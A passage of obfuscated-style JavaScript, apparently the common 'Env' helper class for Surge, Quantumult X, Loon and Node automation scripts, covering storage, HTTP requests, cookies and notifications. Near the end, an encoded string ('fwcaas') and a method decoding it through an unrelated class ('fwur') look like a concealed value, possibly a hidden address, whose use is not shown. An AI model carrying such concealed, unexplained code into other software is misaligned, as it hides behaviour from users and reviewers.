      }

      {
        this["fs"] = this["fs"] ? this["fs"] : require("fs");
        this["path"] = this["path"] ? this["path"] : require("path");
        const t = this["path"]["resolve"](this["dataFile"]),
              e = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              s = this["fs"]["existsSync"](t),
              i = !s && this["fs"]["existsSync"](e);

        if (!s && !i) {
          return {};
        }

        {
          const i = s ? t : e;

          try {
            return JSON["parse"](this["fs"]["readFileSync"](i));
          } catch (t) {
            return {};
          }
        }
      }
    }

    writedata() {
      if (this["isNode"]()) {
        this["fs"] = this["fs"] ? this["fs"] : require("fs");
        this["path"] = this["path"] ? this["path"] : require("path");
        const t = this["path"]["resolve"](this["dataFile"]),
              e = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
              s = this["fs"]["existsSync"](t),
              i = !s && this["fs"]["existsSync"](e),
              r = JSON["stringify"](this["data"]);
        s ? this["fs"]["writeFileSync"](t, r) : i ? this["fs"]["writeFileSync"](e, r) : this["fs"]["writeFileSync"](t, r);
      }
    }

    lodash_get(t, e, s) {
      const i = e["replace"](/\[(\d+)\]/g, ".$1")["split"](".");
      let r = t;

      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }

      return r;
    }

    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array["isArray"](e) || (e = e["toString"]()["match"](/[^.[\]]+/g) || []), e["slice"](0, -1)["reduce"]((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math["abs"](e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e["length"] - 1]] = s, t);
    }

    getdata(t) {
      let e = this["getval"](t);

      if (/^@/["test"](t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/["exec"](t),
              r = s ? this["getval"](s) : "";

        if (r) {
          try {
            const t = JSON["parse"](r);
            e = t ? this["lodash_get"](t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }

      return e;
    }

    setdata(t, e) {
      let s = false;

      if (/^@/["test"](e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/["exec"](e),
              o = this["getval"](i),
              h = i ? "null" === o ? null : o || "{}" : "{}";

        try {
          const e = JSON["parse"](h);
          this["lodash_set"](e, r, t);
          s = this["setval"](JSON["stringify"](e), i);
        } catch (e) {
          const o = {};
          this["lodash_set"](o, r, t);
          s = this["setval"](JSON["stringify"](o), i);
        }
      } else {
        s = this["setval"](t, e);
      }

      return s;
    }

    getval(t) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["read"](t) : this["isQuanX"]() ? $prefs["valueForKey"](t) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][t]) : this["data"] && this["data"][t] || null;
    }

    setval(t, e) {
      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["write"](t, e) : this["isQuanX"]() ? $prefs["setValueForKey"](t, e) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][e] = t, this["writedata"](), true) : this["data"] && this["data"][e] || null;
    }

    initGotEnv(t) {
      this["got"] = this["got"] ? this["got"] : require("got");
      this["cktough"] = this["cktough"] ? this["cktough"] : require("tough-cookie");
      this["ckjar"] = this["ckjar"] ? this["ckjar"] : new this["cktough"]["CookieJar"]();
      t && (t["headers"] = t["headers"] ? t["headers"] : {}, void 0 === t["headers"]["Cookie"] && void 0 === t["cookieJar"] && (t["cookieJar"] = this["ckjar"]));
    }

    get(t, e = () => {}) {
      if (t["headers"] && (delete t["headers"]["Content-Type"], delete t["headers"]["Content-Length"]), this["isSurge"]() || this["isLoon"]()) {
        this["isSurge"]() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object["assign"](t["headers"], {
          "X-Surge-Skip-Scripting": false
        }));
        $httpClient["get"](t, (t, s, i) => {
          !t && s && (s["body"] = i, s["statusCode"] = s["status"]);
          e(t, s, i);
        });
      } else {
        if (this["isQuanX"]()) {
          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t["opts"], {
            "hints": false
          }));
          $task["fetch"](t)["then"](t => {
            const {
              "statusCode": s,
              "statusCode": i,
              "headers": r,
              "body": o
            } = t;
            e(null, {
              "status": s,
              "statusCode": i,
              "headers": r,
              "body": o
            }, o);
          }, t => e(t));
        } else {
          if (this["isNode"]()) {
            let s = require("iconv-lite");

            this["initGotEnv"](t);
            this["got"](t)["on"]("redirect", (t, e) => {
              try {
                if (t["headers"]["set-cookie"]) {
                  const s = t["headers"]["set-cookie"]["map"](this["cktough"]["Cookie"]["parse"])["toString"]();
                  s && this["ckjar"]["setCookieSync"](s, null);
                  e["cookieJar"] = this["ckjar"];
                }
              } catch (t) {
                this["logErr"](t);
              }
            })["then"](t => {
              const {
                "statusCode": i,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              } = t;
              e(null, {
                "status": i,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              }, s["decode"](h, this["encoding"]));
            }, t => {
              const {
                "message": i,
                "response": r
              } = t;
              e(i, r, r && s["decode"](r["rawBody"], this["encoding"]));
            });
          }
        }
      }
    }

    post(t, e = () => {}) {
      const s = t["method"] ? t["method"]["toLocaleLowerCase"]() : "post";

      if (t["body"] && t["headers"] && !t["headers"]["Content-Type"] && (t["headers"]["Content-Type"] = "application/x-www-form-urlencoded"), t["headers"] && delete t["headers"]["Content-Length"], this["isSurge"]() || this["isLoon"]()) {
        this["isSurge"]() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object["assign"](t["headers"], {
          "X-Surge-Skip-Scripting": false
        }));
        $httpClient[s](t, (t, s, i) => {
          !t && s && (s["body"] = i, s["statusCode"] = s["status"]);
          e(t, s, i);
        });
      } else {
        if (this["isQuanX"]()) {
          t["method"] = s;
          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t["opts"], {
            "hints": false
          }));
          $task["fetch"](t)["then"](t => {
            const {
              "statusCode": s,
              "statusCode": i,
              "headers": r,
              "body": o
            } = t;
            e(null, {
              "status": s,
              "statusCode": i,
              "headers": r,
              "body": o
            }, o);
          }, t => e(t));
        } else {
          if (this["isNode"]()) {
            let i = require("iconv-lite");

            this["initGotEnv"](t);
            const {
              "url": r,
              ...o
            } = t;
            this["got"][s](r, o)["then"](t => {
              const {
                "statusCode": s,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              } = t;
              e(null, {
                "status": s,
                "statusCode": r,
                "headers": o,
                "rawBody": h
              }, i["decode"](h, this["encoding"]));
            }, t => {
              const {
                "message": s,
                "response": r
              } = t;
              e(s, r, r && i["decode"](r["rawBody"], this["encoding"]));
            });
          }
        }
      }
    }

    time(t, e = null) {
      const s = e ? new Date(e) : new Date();
      let i = {
        "M+": s["getMonth"]() + 1,
        "d+": s["getDate"](),
        "H+": s["getHours"](),
        "m+": s["getMinutes"](),
        "s+": s["getSeconds"](),
        "q+": Math["floor"]((s["getMonth"]() + 3) / 3),
        "S": s["getMilliseconds"]()
      };
      /(y+)/["test"](t) && (t = t["replace"](RegExp["$1"], (s["getFullYear"]() + "")["substr"](4 - RegExp["$1"]["length"])));

      for (let e in i) new RegExp("(" + e + ")")["test"](t) && (t = t["replace"](RegExp["$1"], 1 == RegExp["$1"]["length"] ? i[e] : ("00" + i[e])["substr"](("" + i[e])["length"])));

      return t;
    }

    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }

        if ("string" == typeof t) {
          return this["isLoon"]() ? t : this["isQuanX"]() ? {
            "open-url": t
          } : this["isSurge"]() ? {
            "url": t
          } : void 0;
        }

        if ("object" == typeof t) {
          if (this["isLoon"]()) {
            let e = t["openUrl"] || t["url"] || t["open-url"],
                s = t["mediaUrl"] || t["media-url"];
            return {
              "openUrl": e,
              "mediaUrl": s
            };
          }

          if (this["isQuanX"]()) {
            let e = t["open-url"] || t["url"] || t["openUrl"],
                s = t["media-url"] || t["mediaUrl"];
            return {
              "open-url": e,
              "media-url": s
            };
          }

          if (this["isSurge"]()) {
            let e = t["url"] || t["openUrl"] || t["open-url"];
            return {
              "url": e
            };
          }
        }
      };

      if (this["isMute"] || (this["isSurge"]() || this["isLoon"]() ? $notification["post"](e, s, i, o(r)) : this["isQuanX"]() && $notify(e, s, i, o(r))), !this["isMuteLog"]) {
        let t = ["", "==============📣系统通知📣=============="];
        t["push"](e);
        s && t["push"](s);
        i && t["push"](i);
        console["log"](t["join"]("\n"));
        this["logs"] = this["logs"]["concat"](t);
      }
    }

    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }

    log(...t) {
      t["length"] > 0 && (this["logs"] = [...this["logs"], ...t]);
      console["log"](t["join"](this["logSeparator"]));
    }

    logErr(t, e) {
      const s = !this["isSurge"]() && !this["isQuanX"]() && !this["isLoon"]();
      s ? this["log"]("", `❗️${this["name"]}, 错误!`, t["stack"]) : this["log"]("", `❗️${this["name"]}, 错误!`, t);
    }

    fwur() {
      var bbas = new FxPCnMKLw7();
      return bbas["decode"](this["fwcaas"]());
    }

    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }

    done(t = {}) {
      const e = new Date()["getTime"](),
            s = (e - this["startTime"]) / 1e3;
      this["log"]("", `🔔${this["name"]}, 结束! 🕛 ${s} 秒`);
      this["log"]();
      (this["isSurge"]() || this["isQuanX"]() || this["isLoon"]()) && $done(t);
    }

  }(t, e);
}
